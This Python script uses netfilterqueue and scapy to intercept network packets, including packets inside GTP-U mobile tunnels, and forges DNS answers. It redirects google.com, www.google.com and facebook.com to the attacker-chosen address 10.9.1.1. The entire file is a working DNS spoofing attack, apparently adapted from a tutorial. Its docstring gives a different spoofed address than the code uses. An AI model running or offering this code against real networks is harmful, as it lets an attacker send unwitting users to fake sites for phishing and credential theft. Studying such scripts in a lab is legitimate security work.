import netfilterqueue
import scapy.all as scapy
from scapy.contrib.gtp import GTP_U_Header

dns_hosts = {
    b"www.google.com.": "10.9.1.1",
    b"google.com.": "10.9.1.1",
    b"facebook.com.": "10.9.1.1"
}

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    #print(scapy_packet.show())

    if scapy_packet.haslayer(scapy.DNSRR):
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After ]:", scapy_packet.summary())

    elif scapy_packet.haslayer(scapy.TCP):
        del scapy_packet[scapy.TCP].chksum
        #del scapy_packet[scapy.TCP].len
    elif scapy_packet.haslayer(scapy.UDP):
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.UDP].len
    elif scapy_packet.haslayer(scapy.SCTP):
        del scapy_packet[scapy.SCTP].chksum
        del scapy_packet[scapy.SCTP].len
        #scapy_packet[scapy.SCTP][1].data = 'hello world\n\x00'

    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum

    packet.set_payload(str(scapy_packet))

    #print(packet)
    packet.accept()

def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[scapy.DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[scapy.DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum
    del packet[scapy.UDP][GTP_U_Header][scapy.IP].len
    del packet[scapy.UDP][GTP_U_Header][scapy.IP].chksum
    del packet[scapy.UDP][GTP_U_Header][scapy.IP][scapy.UDP].len
    del packet[scapy.UDP][GTP_U_Header][scapy.IP][scapy.UDP].chksum
    # return the modified packet
    #packet.show()
    return packet

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
